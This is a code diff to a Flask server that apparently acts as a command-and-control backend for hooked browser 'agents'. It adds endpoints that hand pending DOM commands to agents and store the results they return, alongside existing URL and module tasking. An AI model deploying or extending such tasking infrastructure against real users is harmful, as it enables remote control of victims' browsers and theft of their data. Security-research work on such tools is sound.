@@ -4,7 +4,7 @@ import re
 from datetime import datetime
 from app import db, ConnectedAgents, extraModules, AutomaticModuleExecution
 from flask import jsonify, request, Blueprint, Response, render_template
-from database.models import Url, Registration, Agent, Module
+from database.models import Url, Registration, Agent, Module, DomCommand
 from config import Config
 
 agent = Blueprint('agent', __name__)
@@ -49,10 +49,6 @@ def geturl():
     
     updateAgent(agentID, ConnectedAgents[agentID])
     
-    #ConnectedAgents["fakeagent"]= {"first_seen":1542131642.440264,"ip":"127.0.0.8","last_seen":1542131646.856621}
-
-    ###END UI ####
-    
     module = db.session.query(Module).filter(Module.agentId == agentID, Module.processed == 0).order_by(Module.id.desc()).first()
     if module is not None:
         module.processed = 1
@@ -88,10 +84,35 @@ def addData(uuid):
             return Response("", 404)
         url.response = request.data
         db.session.commit()
-        return "commited"    
+        return "commited"
     print("NO DATA in POST")
     return Response("", 404)
     
+@agent.route('/dom')
+def domGetCommand():
+    agentID = str(request.args.get('agentID'))
+    if agentID is None or agentID == '':
+        return Response("", 404)
+    dom_command = db.session.query(DomCommand).filter(DomCommand.agentId == agentID, DomCommand.processed == 0).first()
+    res = {}
+    if dom_command is not None:
+        dom_command.processed = 1
+        db.session.commit()
+        res['id'] = dom_command.id
+        res['command'] = dom_command.command
+    return jsonify(res)
+
+@agent.route('/dom/<agent_id>/<dom_command_id>', methods = ['POST'])
+def domResult(agent_id, dom_command_id):
+    body = request.get_json(silent = True)
+    if body and body['result']:
+        dom_command = db.session.query(DomCommand).filter(DomCommand.agentId == agent_id, DomCommand.id == dom_command_id, DomCommand.processed == 1).first()
+        if dom_command is not None:
+            dom_command.result = body['result']
+            db.session.commit()
+            return jsonify({'id': dom_command.id})
+    return Response("", 404)
+
 @agent.route('/registration', methods = ['POST'])
 def registration():
     body = request.get_json(silent = True)
